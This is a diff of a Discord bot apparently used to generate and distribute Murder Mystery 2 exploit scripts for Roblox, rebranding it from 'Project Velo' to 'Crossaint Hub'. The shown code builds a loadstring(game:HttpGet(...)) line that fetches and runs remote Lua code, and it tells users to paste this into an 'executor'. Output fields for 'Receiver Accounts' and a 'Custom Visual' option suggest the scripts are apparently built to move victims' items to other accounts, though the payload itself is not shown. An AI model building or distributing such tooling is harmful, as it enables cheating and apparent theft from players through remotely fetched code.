@@ -234,7 +234,7 @@ client.on("interactionCreate", async (interaction) => {
             const loadstr  = `loadstring(game:HttpGet("${rawUrl}"))()`;
 
             const embed = new EmbedBuilder()
-                .setTitle("⚡ Project Velo — Script Generated")
+                .setTitle("⚡ Crossaint Hub — Script Generated")
                 .setColor(0x6c5ce7)
                 .addFields(
                     { name: "Receiver Accounts", value: receiverAccounts.join(", "),                        inline: false },
@@ -244,7 +244,7 @@ client.on("interactionCreate", async (interaction) => {
                     { name: "Custom Visual", value: customLuaVisual ? "Yes" : "No", inline: true },
                     { name: "Loadstring",    value: `\`\`\`lua\n${loadstr}\n\`\`\``, inline: false },
                 )
-                .setFooter({ text: "Project Velo • paste loadstring in your executor" })
+                .setFooter({ text: "Crossaint Hub • paste loadstring in your executor" })
                 .setTimestamp();
 
             const row = new ActionRowBuilder().addComponents(
@@ -264,7 +264,7 @@ client.on("interactionCreate", async (interaction) => {
     // ── /help ──────────────────────────────────────────────────────────────────
     if (interaction.commandName === "help") {
         const embed = new EmbedBuilder()
-            .setTitle("⚡ Project Velo — Help")
+            .setTitle("⚡ Crossaint Hub — Help")
             .setColor(0x6c5ce7)
             .setDescription("Generate and deploy MM2 scripts via Discord slash commands.")
             .addFields(
@@ -283,7 +283,7 @@ client.on("interactionCreate", async (interaction) => {
                     value: "Copy the loadstring from the generated output and paste it into your executor.",
                 },
             )
-            .setFooter({ text: "Project Velo" });
+            .setFooter({ text: "Crossaint Hub" });
 
         return interaction.reply({ embeds: [embed], flags: MessageFlags.Ephemeral });
     }
